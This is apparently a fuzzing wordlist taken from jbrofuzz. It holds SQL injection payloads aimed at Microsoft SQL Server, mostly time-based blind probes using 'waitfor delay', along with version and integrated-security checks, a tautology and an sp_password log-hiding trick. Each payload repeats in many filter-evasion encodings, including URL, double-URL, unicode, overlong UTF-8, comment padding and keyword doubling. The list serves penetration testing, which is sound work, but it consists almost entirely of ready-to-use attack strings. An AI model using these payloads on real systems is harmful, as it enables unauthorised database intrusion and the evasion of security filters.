# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)
%00
IyBjb250YWlucyBzdGF0ZW1lbnRzIGZyb20gamJyb2Z1enogKDEzIEFwcmlsIDIwMTApCg==
# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

%2523%2520%2563%256F%256E%2574%2561%2569%256E%2573%2520%2573%2574%2561%2574%2565%256D%2565%256E%2574%2573%2520%2566%2572%256F%256D%2520%256A%2562%2572%256F%2566%2575%257A%257A%2520%2528%2531%2533%2520%2541%2570%2572%2569%256C%2520%2532%2530%2531%2530%2529%250A
%23%20%63%6F%6E%74%61%69%6E%73%20%73%74%61%74%65%6D%65%6E%74%73%20%66%72%6F%6D%20%6A%62%72%6F%66%75%7A%7A%20%28%31%33%20%41%70%72%69%6C%20%32%30%31%30%29%0A
%u0023%u0020%u0063%u006F%u006E%u0074%u0061%u0069%u006E%u0073%u0020%u0073%u0074%u0061%u0074%u0065%u006D%u0065%u006E%u0074%u0073%u0020%u0066%u0072%u006F%u006D%u0020%u006A%u0062%u0072%u006F%u0066%u0075%u007A%u007A%u0020%u0028%u0031%u0033%u0020%u0041%u0070%u0072%u0069%u006C%u0020%u0032%u0030%u0031%u0030%u0029%u000A
# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements FRFROMOM jbrofuzz (13 April 2010)

%C0%AB%C0%AAcontains%C0%AAstatements%C0%AAfrom%C0%AAjbrofuzz%C0%AA%C0%AA13%C0%AAApril%C0%AA2010%C0%AB%C0%8A
%# %c%o%n%t%a%i%n%s %s%t%a%t%e%m%e%n%t%s %f%r%o%m %j%b%r%o%f%u%z%z %(%1%3 %A%p%r%i%l %2%0%1%0%)%

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)
 and '0having'='0having'
# contains statements from jbrofuzz (13 April 2010)
sp_password
#/**/contains/**/statements/**/from/**/jbrofuzz/**/(13/**/April/**/2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

#%07contains%0Astatements%01from%04jbrofuzz%04(13%01April%0D2010)

# contains statements from jbrofuzz (13 April 2010)

#%09contains%09statements%09from%0Djbrofuzz%0B(13%0AApril%092010)

# contains statements from jbrofuzz (13 April 2010)

#+contains+statements+from+jbrofuzz+(13+April+2010)

#%0Dcontains%09statements%0Cfrom%09jbrofuzz%0A(13%09April%0C2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

%EF%BC%87; if not(substring((select @@version),25,1) <> 0) waitfor delay %EF%BC%870:0:2%EF%BC%87 --

%00%27; if not(substring((select @@version),25,1) <> 0) waitfor delay %00%270:0:2%00%27 --

%u0027%u003B%u0020%u0069%u0066%u0020%u006E%u006F%u0074%u0028%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0073%u0065%u0072%u0076%u0065%u0072%u0070%u0072%u006F%u0070%u0065%u0072%u0074%u0079%u0028%u0027%u0069%u0073%u0069%u006E%u0074%u0065%u0067%u0072%u0061%u0074%u0065%u0064%u0073%u0065%u0063%u0075%u0072%u0069%u0074%u0079%u006F%u006E%u006C%u0079%u0027%u0029%u0029%u0020%u003C%u003E%u0020%u0030%u0029%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0027%u0020%u002D%u002D%u000A
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; /*!30823if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' */--

'; /*!00000if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' */--

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((SESELECTLECT serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

%C0%AF%C0%BB%C0%AAif%C0%AAnot%C0%AA%C0%AAselect%C0%AAserverproperty%C0%AA%C0%AFisintegratedsecurityonly%C0%AF%C0%AB%C0%AB%C0%AA%C0%BE%C0%BE%C0%AA0%C0%AB%C0%AAwaitfor%C0%AAdelay%C0%AA%C0%AF0%C0%BA0%C0%BA2%C0%AF%C0%AA%C0%AF%C0%AF%C0%8A
%'%; %i%f %n%o%t%(%(%s%e%l%e%c%t %s%e%r%v%e%r%p%r%o%p%e%r%t%y%(%'%i%s%i%n%t%e%g%r%a%t%e%d%s%e%c%u%r%i%t%y%o%n%l%y%'%)%) %<%> %0%) %w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%2%' %-%-%

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
 and '0having'='0having'
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
-- sp_password
';/**/if/**/not((select/**/serverproperty('isintegratedsecurityonly'))/**/<>/**/0)/**/waitfor/**/delay/**/'0:0:2'/**/--

';--VqlICecgBTl%0Aif--iAJneUy%0Anot((select--JVfGmgbeJwzg%0Aserverproperty('isintegratedsecurityonly'))--tvfwLSe%0A<>--SRALmOv%0A0)--ILXaDHpLh%0Awaitfor--zJOlCh%0Adelay--gWbMCNw%0A'0:0:2'--ClQOCw%0A----SxKGlm%0A
';%23ydzPYLuNYoDT%0Aif%23xYTvxRKK%0Anot((select%23GWXAwGUbkD%0Aserverproperty('isintegratedsecurityonly'))%23ynCorMADv%0A<>%23dTNMtYqvp%0A0)%23mEACsxsp%0Awaitfor%23XTrrUqFqIY%0Adelay%23xzUuGXJQawg%0A'0:0:2'%23wCHrHZvEAc%0A--%23eHDDBcQCIK%0A
';%23RQJcyJ%0Aif%23CiskIhvplq%0Anot((select%23ZjICHAGMhR%0Aserverproperty('isintegratedsecurityonly'))%23voWWzqqBbMSB%0A<>%23NGJWeCRBAEv%0A0)%23jxeEGlk%0Awaitfor%23WCYFbG%0Adelay%23NRskohq%0A'0:0:2'%23ygihlWf%0A--%23oCBIfb%0A
';%0Cif%0Enot((select%08serverproperty('isintegratedsecurityonly'))%0F<>%0C0)%0Dwaitfor%0Ddelay%0B'0:0:2'%0F--

';%23%0Aif%23%0Anot((select%23%0Aserverproperty('isintegratedsecurityonly'))%23%0A<>%23%0A0)%23%0Awaitfor%23%0Adelay%23%0A'0:0:2'%23%0A--%23%0A
';%0Bif%0Bnot((select%09serverproperty('isintegratedsecurityonly'))%0A<>%0B0)%0Bwaitfor%0Bdelay%0C'0:0:2'%0C--

';--%0Aif--%0Anot((select--%0Aserverproperty('isintegratedsecurityonly'))--%0A<>--%0A0)--%0Awaitfor--%0Adelay--%0A'0:0:2'--%0A----%0A
';+if+not((select+serverproperty('isintegratedsecurityonly'))+<>+0)+waitfor+delay+'0:0:2'+--

';%0Aif%09not((select%0Dserverproperty('isintegratedsecurityonly'))%0C<>%0D0)%0Awaitfor%09delay%0A'0:0:2'%0C--

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

%bf%27; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --

